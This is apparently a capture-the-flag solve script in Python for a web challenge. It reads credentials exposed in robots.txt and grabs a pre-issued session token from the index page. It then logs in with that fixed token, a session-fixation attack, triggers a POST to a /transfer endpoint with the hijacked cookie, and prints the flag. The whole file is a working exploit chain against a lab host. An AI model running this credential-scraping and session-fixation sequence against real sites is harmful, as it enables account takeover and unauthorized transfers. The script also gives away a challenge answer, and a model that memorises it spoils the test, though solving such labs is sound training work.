# solve_trojan_ledger.py
import re, urllib.request, urllib.parse

TARGET = "http://192.168.45.128:8082"

# Step 1 — paper trail
robots = urllib.request.urlopen(TARGET + "/robots.txt").read().decode()
user, pwd = re.search(r"#\s*([^:]+):(\S+)", robots).groups()

index = urllib.request.urlopen(TARGET + "/").read().decode()
token = re.search(r"issued:\s*(\S+)", index).group(1)

# Step 2 — login (session fixation: present the fixed token)
urllib.request.urlopen(TARGET + "/", data=urllib.parse.urlencode({
    "session_token": token, "username": user, "password": pwd,
}).encode())

# Step 3 — transfer with the fixed session cookie (POST-only endpoint)
req = urllib.request.Request(TARGET + "/transfer", data=b"",
                             headers={"Cookie": f"session_token={token}"})
html = urllib.request.urlopen(req).read().decode()
print(re.search(r"MAHASONA\{[^}]+\}", html).group(0))
